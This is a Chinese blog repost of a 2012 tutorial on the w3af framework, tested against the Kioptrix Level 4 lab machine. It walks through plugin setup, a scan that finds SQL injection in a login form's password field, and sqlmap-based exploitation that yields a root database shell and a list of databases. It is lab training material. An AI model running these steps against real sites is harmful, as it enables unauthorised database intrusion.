---
title: "w3af 简单使用教程"
date: 2012-08-25T21:36:30+08:00
lastmod: 2012-08-25T21:37:30+08:00
keywords: [w3af 简单使用教程]
description: "w3af 简单使用教程"
categories: [Misc]

---

本文为 2012 年在 [FreeBuf](https://www.freebuf.com/ "FreeBuf") 发表的文章，原地址为：[w3af 简单使用教程](https://www.freebuf.com/articles/5472.html "w3af 简单使用教程")。以下内容均无修改。

w3af是一个Web应用程序攻击和检查框架.该项目已超过130个插件,其中包括检查网站爬虫,SQL注入(SQL Injection),跨站(XSS),本地文件包含(LFI),远程文件包含(RFI)等.该项目的目标是要建立一个框架,以寻找和开发Web应用安全漏洞,所以很容易使用和扩展.

<!--more-->

## 0×00 概述

在BackTrack5R3下使用w3af测试Kioptrix Level 4的SQL注入漏洞.

## 0×01 简介

w3af是一个Web应用程序攻击和检查框架.该项目已超过130个插件,其中包括检查网站爬虫,SQL注入(SQL Injection),跨站(XSS),本地文件包含(LFI),远程文件包含(RFI)等.该项目的目标是要建立一个框架,以寻找和开发Web应用安全漏洞,所以很容易使用和扩展.

## 0×02 安装

```shell
root@bt:~# apt-get install w3af
```

## 0×03 启动

```shell
root@bt:~# cd /pentest/web/w3af/
root@bt:/pentest/web/w3af# ./w3af_console
```

## 0×04 漏洞扫描配置

```text
w3af>>> plugins
//进入插件模块
w3af/plugins>>> list discovery 
//列出所有用于发现的插件
w3af/plugins>>> discovery findBackdoor phpinfo webSpider 
//启用findBackdoor phpinfo webSpider这三个插件
w3af/plugins>>> list audit 
//列出所有用于漏洞的插件
w3af/plugins>>> audit blindSqli fileUpload osCommanding sqli xss 
//启用blindSqli fileUpload osCommanding sqli xss这五个插件
w3af/plugins>>> back
//返回主模块
w3af>>> target
//进入配置目标的模块
w3af/config:target>>> set target http://192.168.244.132/
//把目标设置为http://192.168.244.132/
w3af/config:target>>> back
//返回主模块
```

## 0×05 漏洞扫描

```text
w3af>>> start
```

```text
---
New URL found by phpinfo plugin: http://192.168.244.132/
New URL found by phpinfo plugin: http://192.168.244.132/checklogin.php
New URL found by phpinfo plugin: http://192.168.244.132/index.php
New URL found by webSpider plugin: http://192.168.244.132/
New URL found by webSpider plugin: http://192.168.244.132/checklogin.php
New URL found by webSpider plugin: http://192.168.244.132/index.php
Found 3 URLs and 8 different points of injection.
The list of URLs is:
- http://192.168.244.132/index.php
- http://192.168.244.132/checklogin.php
- http://192.168.244.132/
The list of fuzzable requests is:
- http://192.168.244.132/ | Method: GET
- http://192.168.244.132/ | Method: GET | Parameters: (mode="phpinfo")
- http://192.168.244.132/ | Method: GET | Parameters: (view="phpinfo")
- http://192.168.244.132/checklogin.php | Method: GET
- http://192.168.244.132/checklogin.php | Method: POST | Parameters: (myusername="", mypassword="")
- http://192.168.244.132/index.php | Method: GET
- http://192.168.244.132/index.php | Method: GET | Parameters: (mode="phpinfo")
- http://192.168.244.132/index.php | Method: GET | Parameters: (view="phpinfo")
Blind SQL injection was found at: "http://192.168.244.132/checklogin.php", using HTTP method POST. The injectable parameter is: "mypassword". This vulnerability was found in the requests with ids 309 to 310.
A SQL error was found in the response supplied by the web application, the error is (only a fragment is shown): "supplied argument is not a valid MySQL". The error was found on response with id 989.
A SQL error was found in the response supplied by the web application, the error is (only a fragment is shown): "mysql_". The error was found on response with id 989.
SQL injection in a MySQL database was found at: "http://192.168.244.132/checklogin.php", using HTTP method POST. The sent post-data was: "myusername=John&Submit=Login&mypassword=d'z"0". The modified parameter was "mypassword". This vulnerability was found in the request with id 989.
Scan finished in 19 seconds.
---
//开始扫描
```

## 0×06 漏洞利用配置

```text
w3af>>> exploit 
//进入漏洞利用模块
w3af/exploit>>> list exploit
//列出所有用于漏洞利用的插件
w3af/exploit>>> exploit sqlmap 
//使用sqlmap进行SQL注入漏洞的测试
```

```text
---
Trying to exploit using vulnerability with id: [1010, 1011]. Please wait...
Vulnerability successfully exploited. This is a list of available shells and proxies:
- [0] <sql object ( dbms: "MySQL >= 5.0.0" | ruser: "root@localhost" )>
Please use the interact command to interact with the shell objects.
---
//测试存在SQL注入漏洞
//这里要记住shell objects(这里是0),等一下要用到
0x07 漏洞利用
w3af/exploit>>> interact 0
//interact + shell object就可以利用了

---
Execute "exit" to get out of the remote shell. Commands typed in this menu will be run through the sqlmap shell
w3af/exploit/sqlmap-0>>> 
---
//sqlmap的一个交互式模块

w3af/exploit/sqlmap-0>>> dbs   

---
Available databases:  [3]:
[*] information_schema
[*] members
[*] mysql
---
//成功获得数据库信息
```
